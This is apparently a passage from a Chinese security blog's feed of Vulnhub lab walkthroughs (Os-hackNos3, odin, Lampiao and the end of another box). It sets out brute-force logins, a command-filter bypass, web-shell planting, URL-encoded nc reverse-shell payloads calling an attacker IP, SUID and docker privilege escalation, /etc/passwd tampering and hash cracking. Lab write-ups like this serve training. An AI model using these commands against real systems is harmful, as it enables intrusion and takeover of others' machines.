-t 100  -o dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.132.135</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe92837ef63e" alt="image-20201221103820924"></p><p>查看一下secret目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9283e39984" alt="image-20201221103858235"></p><p>ls查看一下目录，发现被拦截。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe92842dfcc2" alt="image-20201221103927926"></p><h3 id="命令执行绕过利用"><a href="#命令执行绕过利用" class="headerlink" title="命令执行绕过利用"></a>命令执行绕过利用</h3><p>经过fuzz发现会拦截如下 bash nc python cat ls</p><p>这里我们使用dir命令查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe928481744b" alt="image-20201221104033027"></p><p>burpsuite里进行攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9284d84969" alt="image-20201221104120445"></p><p>对命令执行进行绕过，并反弹会来shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#96;命令&#96;</span><br></pre></td></tr></table></figure><p>以上可以绕过过滤</p><p>我们使用nc反弹回来shell</p><p><img src="https://img.rruu.net/image/5fe928533cbf8" alt="image-20201221104319020"></p><p><img src="https://img.rruu.net/image/5fe928586b0bc" alt="image-20201221104408954"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>通过id命令，获取当前用户权限为www。</p><p>先做一下信息收集</p><p>发现可疑的hacker.php，我们不着急查看。进行收集用户信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find .&#x2F; -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9285f396cb" alt="image-20201221104721387"></p><p>查看用户，发现三个用户，笔记本记下来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9286433e83" alt="image-20201221104834104"></p><p>对用户home目录进行信息收集，切换bash。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe92868cae2d" alt="image-20201221105206824"></p><p>权限太小了。真的离谱。</p><p><img src="https://img.rruu.net/image/5fe9286d165fe" alt="image-20201221105308618"></p><p>tmp目录是否有敏感文件泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe92871dd6e7" alt="image-20201221105339912"></p><p>没有发现任何有价值的信息</p><p>这里注意一下这个helpline.sh的脚本，具有sudo不需要密码的权限，后面可能有用。截至目前，没有任何太大的进展。</p><p><img src="https://img.rruu.net/image/5fe92876d7a21" alt="image-20201221105403304"></p><h3 id="尝试suid提权"><a href="#尝试suid提权" class="headerlink" title="尝试suid提权"></a>尝试suid提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>没有发现有利用价值的文件</p><p><img src="https://img.rruu.net/image/5fe9287c9656c" alt="image-20201221105658149"></p><h3 id="分析hacker-php文件"><a href="#分析hacker-php文件" class="headerlink" title="分析hacker.php文件"></a>分析hacker.php文件</h3><p><img src="https://img.rruu.net/image/5fe9288223af0" alt="image-20201221105914810"></p><p>发现有一张图片，我们去下载这张图片。</p><p>使用exiftool分析，没有发现有价值的。</p><p><img src="https://img.rruu.net/image/5fe928876a93f" alt="image-20201221110102475"></p><p>使用steghide分析图片，发现存在一个压缩包，我们分离一下压缩包。</p><p><img src="https://img.rruu.net/image/5fe9288ccdfe9" alt="image-20201221110330785"></p><p>发现需要密码</p><p><img src="https://img.rruu.net/image/5fe9289233a4a" alt="image-20201221110347911"></p><p>使用fcrackzip爆破zip密码</p><p><img src="https://img.rruu.net/image/5fe928978f5f5" alt="image-20201221110501542"></p><p>解压backup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure><p>分析source_code.php</p><p><img src="https://img.rruu.net/image/5fe9289c8ca4a" alt="image-20201221110629860"></p><p>发现一个这个base64加密的密文，我们解密一下。</p><p><img src="https://img.rruu.net/image/5fe928a20b4f5" alt="image-20201221110721782"></p><p>这个可能是一个密码，我们把前面收集到的用户名密码，来做爆破ssh。</p><p><img src="https://img.rruu.net/image/5fe928a6b5582" alt="image-20201221110812839"></p><p>爆破成功，登录ssh</p><p><img src="https://img.rruu.net/image/5fe928ab8485d" alt="image-20201221110832790"></p><p>读取flag</p><p>这里的./.helpline.sh文件是一个命令执行脚本，前面我们知道了sudo -u制定为apaar权限即可运行这个脚本，我们使用这个脚本去读取local.txt文件</p><p><img src="https://img.rruu.net/image/5fe928b05a0eb" alt="image-20201221110906712"></p><p>这个接受msg变量，然后执行。</p><p><img src="https://img.rruu.net/image/5fe928b67f03c" alt="image-20201221111022681"></p><p><img src="https://img.rruu.net/image/5fe928baf164c" alt="image-20201221111118390"></p><h3 id="docker权限提升"><a href="#docker权限提升" class="headerlink" title="docker权限提升"></a>docker权限提升</h3><p>查看id属于docker组，我们使用docker提权。</p><p><img src="https://img.rruu.net/image/5fe5461256c83" alt="image-20201221111957878"></p><p>提升权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v &#x2F;:&#x2F;mnt bash</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54616dacf5" alt="image-20201221112029286"></p><p>思路：目前我们将目标靶机的整盘目录挂载到了docker中，且在/mnt目录下，我们修改/mnt目录下面的文件，会直接影响到靶机。所以我们修改/etc/passwd文件，添加root权限用户。</p><p>生成密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opensll passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5461b85e5e" alt="image-20201221121258488"></p><p>进入我们刚刚root权限的虚拟容器shell，添加用户。格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;mnt&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe546206c6a7" alt="image-20201221121420566"></p><p>查看flag文件</p><p><img src="https://img.rruu.net/image/5fe54626beec6" alt="image-20201221121612040"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Os-hackNos3</title>
      <link href="2020/12/27/Os-hackNos3/"/>
      <url>2020/12/27/Os-hackNos3/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.107</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap探测服务"><a href="#nmap探测服务" class="headerlink" title="nmap探测服务"></a>nmap探测服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sS -p- 192.168.56.107 -oN Os-hackNos3</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe83667d1cb8" alt="image-20201218113055480"></p><p>简单查看一下80端口站点，没有任何有价值的东西。</p><p><img src="https://img.rruu.net/image/5fe8366e7384a" alt="image-20201218113142446"></p><h3 id="gobuster扫描目录"><a href="#gobuster扫描目录" class="headerlink" title="gobuster扫描目录"></a>gobuster扫描目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -e -l -u http:&#x2F;&#x2F;192.168.56.107</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8367cda590" alt="image-20201218113316571"></p><p>查看websec目录，发现一个web站点。</p><p><img src="https://img.rruu.net/image/5fe83681ec7a1" alt="image-20201218113455479"></p><p>采集一下信息，发现一个邮箱。</p><p><img src="https://img.rruu.net/image/5fe8368759c96" alt="image-20201218113540605"></p><p>再次使用gobuster目录探测websec目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -e -l -u http:&#x2F;&#x2F;192.168.56.107&#x2F;websec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8368c1743f" alt="image-20201218113702667"></p><p>查看一下admin目录，发现后台。</p><p><img src="https://img.rruu.net/image/5fe8369126a4a" alt="image-20201218113725781"></p><h3 id="cewl爬取网页"><a href="#cewl爬取网页" class="headerlink" title="cewl爬取网页"></a>cewl爬取网页</h3><p><img src="https://img.rruu.net/image/5fe83696b0d0b" alt="image-20201218114050009"></p><h2 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h2><h3 id="wfuzz暴力破解后台"><a href="#wfuzz暴力破解后台" class="headerlink" title="wfuzz暴力破解后台"></a>wfuzz暴力破解后台</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;root&#x2F;Os-hackNos-3&#x2F;websec.txt -d &quot;username&#x3D;contact@hacknos.com&amp;password&#x3D;FUZZ&quot; --hl 41 http:&#x2F;&#x2F;192.168.56.107&#x2F;websec&#x2F;admin</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8369c251fb" alt="image-20201218114122010"></p><p>获得用户名密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usernmae：contact@hacknos.com password：Securityx</span><br></pre></td></tr></table></figure><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>写入shell</p><p><img src="https://img.rruu.net/image/5fe836a0d29bc" alt="image-20201218195404380"></p><p>测试shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.107&#x2F;websec&#x2F;?magisec&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836a548f9e" alt="image-20201218195457977"></p><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836a97b2b8" alt="image-20201218195541401"></p><p>浏览器请求，一定要url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.107&#x2F;websec&#x2F;?magisec&#x3D;rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+192.168.56.105+9001+%3e%2ftmp%2ff</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836ae0de61" alt="image-20201218195704538"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>这里使用ls命令的时候要这样用，要不然有一些隐藏的文件看不到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836b32d88a" alt="image-20201218195800265"></p><p>没有发现有用的文件</p><p><img src="https://img.rruu.net/image/5fe836b83d355" alt="image-20201218195915561"></p><p>搜索suid特权文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>发现利用文件，相关使用链接 <a href="https://gtfobins.github.io/gtfobins/cpulimit">https://gtfobins.github.io/gtfobins/cpulimit</a></p><p><img src="https://img.rruu.net/image/5fe836bd205e6" alt="image-20201218200650409"></p><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>在当前环境中，cpulimit因为suid权限，所以，我们通过-f运行的程序就有root权限，但是这里直接利用不行，需要写一个c文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpulimit -l 100 -f &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>gcc 编译利用，传到目标上面去。</p><p><img src="https://img.rruu.net/image/5fe836c23a39a" alt="image-20201218201026125"></p><p>python开启http服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836c6adf02" alt="image-20201218201153063"></p><p>目标下载文件</p><p><img src="https://img.rruu.net/image/5fe836cbc7cfc" alt="image-20201218201217304"></p><p>给755权限</p><p><img src="https://img.rruu.net/image/5fe836d14fa81" alt="image-20201218201254858"></p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpulimit -l 100 -f .&#x2F;exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836d63b068" alt="image-20201218201424440"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>odin</title>
      <link href="2020/12/27/odin/"/>
      <url>2020/12/27/odin/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.120</p><p>修改一下kali的hosts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;odin 192.168.56.120&quot; &gt;&gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap扫描端口"><a href="#Nmap扫描端口" class="headerlink" title="Nmap扫描端口"></a>Nmap扫描端口</h3><p><img src="https://img.rruu.net/image/5fe835e7205db" alt="image-20201222151951057"></p><h4 id="扫描结果分析："><a href="#扫描结果分析：" class="headerlink" title="扫描结果分析："></a>扫描结果分析：</h4><p>系统版本：ubunut</p><p>开放端口：80</p><p>80 web</p><h4 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h4><p>通过80端口getshell</p><h2 id="80端口渗透测试"><a href="#80端口渗透测试" class="headerlink" title="80端口渗透测试"></a>80端口渗透测试</h2><p>firefox打开网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;odin&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe835ed656c9"></p><h3 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h3><p>进入网站，发现网站存在编码，可能是base64。我们使用base64解码，发现乱码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;NB2HI4DTHIXS6Z3JORUHKYROMNXW2L3EMFXGSZLMNVUWK43TNRSXEL2TMVRUY2LTORZS6YTMN5RC63LBON2GK4RPKBQXG43XN5ZGI4ZPJRSWC23FMQWUIYLUMFRGC43FOMXXE33DNN4W65JOOR4HILTUMFZC4Z32EBZG6Y3LPFXXKIDONFRWKIDXN5ZGI3DJON2AU&#x3D;&#x3D;&#x3D;63LBON2GK4RPKBQXG43XN5ZGI4ZPJRSWC23FMQWUIYLUMFRGC43FOMXXE33DNN4W65JOOR4HILTUFZC4Z32EBZG6Y3LPFXXKIDONFRWKIDXN5ZGI3DJON2AU&#x3D;&#x3D;&#x3D;&quot; | base64 -d</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe835f349a5a" alt="image-20201222152523386"></p><p>继续解码，他这个的意思是说，如果你细心那么就不用看这里。</p><p><img src="https://img.rruu.net/image/5fe835f84601c" alt="image-20201222152335816"></p><p>继续探测发现一串密码，解密网站：<a href="http://tool.bugku.com/brainfuck/?wafcloud=1">http://tool.bugku.com/brainfuck/?wafcloud=1</a> 目前也不知道有何用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nottuzy</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe835fdccf9f" alt="image-20201222152841015"></p><h3 id="whatweb识别cms"><a href="#whatweb识别cms" class="headerlink" title="whatweb识别cms"></a>whatweb识别cms</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:&#x2F;&#x2F;192.168.56.120&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe83602ba86f" alt="image-20201222153905511"></p><p>网站架构：wordpress 5.5.3 apache ubuntu</p><h3 id="搜索历史漏洞"><a href="#搜索历史漏洞" class="headerlink" title="搜索历史漏洞"></a>搜索历史漏洞</h3><p>没有发现利用价值的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seachsploit WordPress 5.5.3</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836083d218" alt="image-20201222154126090"></p><h3 id="wpscan扫描网站"><a href="#wpscan扫描网站" class="headerlink" title="wpscan扫描网站"></a>wpscan扫描网站</h3><p>简单检测一下网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;odin&#x2F; -e</span><br></pre></td></tr></table></figure><p>有价值的信息如下：</p><p><img src="https://img.rruu.net/image/5fe8360e137d8" alt="image-20201222155420951"></p><p>使用cewl生成爆破字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;odin&#x2F; &gt; pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836133195c" alt="image-20201222160131060"></p><p>我们使用wpscan暴力破解一下admin的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;odin&#x2F; --usernames admin --passwords .&#x2F;pass.txt --password-attack wp-login</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836184c225" alt="image-20201222155839817"></p><p>爆破失败，我们再用一下自带字典，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;odin&#x2F; --usernames admin --passwords &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --password-attack wp-login</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8361e89098" alt="image-20201222155643800"></p><h3 id="wordpress模板文件getshell"><a href="#wordpress模板文件getshell" class="headerlink" title="wordpress模板文件getshell"></a>wordpress模板文件getshell</h3><p><img src="https://img.rruu.net/image/5fe836248494f" alt="image-20201222160355158"></p><p><img src="https://img.rruu.net/image/5fe8362a0794c" alt="image-20201222160417063"></p><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p>kali执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8362edec63" alt="image-20201222160704805"></p><p>然后开另外一个终端执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;odin&#x2F;?magisec&#x3D;rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+192.168.56.105+9001+%3e%2ftmp%2ff</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836339d6a6" alt="image-20201222160715537"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="Python3切换bash"><a href="#Python3切换bash" class="headerlink" title="Python3切换bash"></a>Python3切换bash</h3><p>这个机器没有python2，用的python3我们这里命令要换成python3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe836389462a" alt="image-20201222160838725"></p><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>首先查看web网站的配置文件</p><p><img src="https://img.rruu.net/image/5fe8363dbfc8c" alt="image-20201222163307124"></p><p>看到下面，有root密码。</p><p><img src="https://img.rruu.net/image/5fe83642a15f6" alt="image-20201222165537456"></p><h3 id="john破解密码"><a href="#john破解密码" class="headerlink" title="john破解密码"></a>john破解密码</h3><p>将密码保存到root.txt中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$6$e9hWlnuTuxApq8h6$ClVqvF9MJa424dmU96Hcm6cvevBGP1OaHbWg&#x2F;&#x2F;71DVUF1kt7ROW160rv9oaL7uKbDr2qIGsSxMmocdudQzjb01&#39; &gt; .&#x2F;vulnhub&#x2F;odin&#x2F;root.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8364754216" alt="image-20201222165641152"></p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt root.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8364c5242b" alt="image-20201222165730160"></p><p>密码已经出来了，使用show来查看一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john root.txt --show</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe83650d59c6" alt="image-20201222165759327"></p><p>切换root</p><p><img src="https://img.rruu.net/image/5fe83655e02aa" alt="image-20201222165916528"></p><h3 id="获取flag文件"><a href="#获取flag文件" class="headerlink" title="获取flag文件"></a>获取flag文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat bjorn</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe8365b6fb0f" alt="image-20201222165944197"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Lampiao</title>
      <link href="2020/12/26/Lampiao/"/>
      <url>2020/12/26/Lampiao/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.119</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap探测端口"><a href="#Nmap探测端口" class="headerlink" title="Nmap探测端口"></a>Nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- 192.168.56.119 -oN .&#x2F;Lampiao&#x2F;Lampiao.nmap</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d69fce8f0" alt="image-20201222100903229"></p><h3 id="分析Nmap扫描结果"><a href="#分析Nmap扫描结果" class="headerlink" title="分析Nmap扫描结果"></a>分析Nmap扫描结果</h3><p>操作系统：ubuntu 低版本</p><p>端口开放：22 80 1898</p><p>22 ssh</p><p>80 web （不正常的web程序，gobuster爆破目录有问题，换了两台不同的机器都是一样。dirb尝试也是一样爆破不行。）</p><p>1898 web （Drupal 7）</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p><img src="https://img.rruu.net/image/5fe6d6a5e1b13" alt="image-20201222105527902"></p><h3 id="gobuster扫描目录"><a href="#gobuster扫描目录" class="headerlink" title="gobuster扫描目录"></a>gobuster扫描目录</h3><p>他说的这个靶机这个很简单的。我们使用gobuster扫描一下靶机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.119 -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d6ab68d78" alt="image-20201222105703038"></p><h2 id="1898端口渗透"><a href="#1898端口渗透" class="headerlink" title="1898端口渗透"></a>1898端口渗透</h2><h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><p>根据nmap扫描的信息，我们分析一下这个1898端口。它是由drupal7搭建的，这里nmap给了一些文件，我们去访问一下，可以发现一些信息泄露。drupal版本号7.54，这个网站的ico也是drupal默认的。</p><p><img src="https://img.rruu.net/image/5fe6d6b0de8e8" alt="image-20201222105347138"></p><h3 id="Drupal7漏洞利用"><a href="#Drupal7漏洞利用" class="headerlink" title="Drupal7漏洞利用"></a>Drupal7漏洞利用</h3><p>我们搜索一下漏洞选择第一个，他说这个是有metasploit框架的利用程序的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal 7.54</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe6d6b6bc245" alt="image-20201222105743117"></p><p>来到msf找到利用程序，use选中</p><p><img src="https://img.rruu.net/image/5fe6d6bc97a49" alt="image-20201222110233244"></p><p>设置如下，返回了一个会话。</p><p><img src="https://img.rruu.net/image/5fe6d6c1b3731" alt="image-20201222110352743"></p><p>查看一下权限</p><p><img src="https://img.rruu.net/image/5fe6d6c78eb26" alt="image-20201222110451193"></p><h2 id="提权提升"><a href="#提权提升" class="headerlink" title="提权提升"></a>提权提升</h2><p>当前权限为3w，我们先做信息收集。</p><h3 id="Python切换bash"><a href="#Python切换bash" class="headerlink" title="Python切换bash"></a>Python切换bash</h3><p><img src="https://img.rruu.net/image/5fe6d6cc6230a" alt="image-20201222110916489"></p><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p><img src="https://img.rruu.net/image/5fe6d6d117709" alt="image-20201222111236570"></p><h3 id="ssh登录碰撞"><a href="#ssh登录碰撞" class="headerlink" title="ssh登录碰撞"></a>ssh登录碰撞</h3><p>尝试将收集到密码用于登录，结果失败。我们继续去收集一下用户信息。</p><p><img src="https://img.rruu.net/image/5fe6d6d5813e0" alt="image-20201222111447625"></p><p>来到home目录，我们尝试一下这个用户。</p><p><img src="https://img.rruu.net/image/5fe6d6daed914" alt="image-20201222111526744"></p><p>尝试成功。</p><p><img src="https://img.rruu.net/image/5fe6d6df8c24a" alt="image-20201222111629866"></p><h3 id="脏牛特权提升"><a href="#脏牛特权提升" class="headerlink" title="脏牛特权提升"></a>脏牛特权提升</h3><p><img src="https://img.rruu.net/image/5fe6d6e43a981" alt="image-20201222111727210"></p><p>内核版本为4.4.0</p><p><img src="https://img.rruu.net/image/5fe6d6e9e7864" 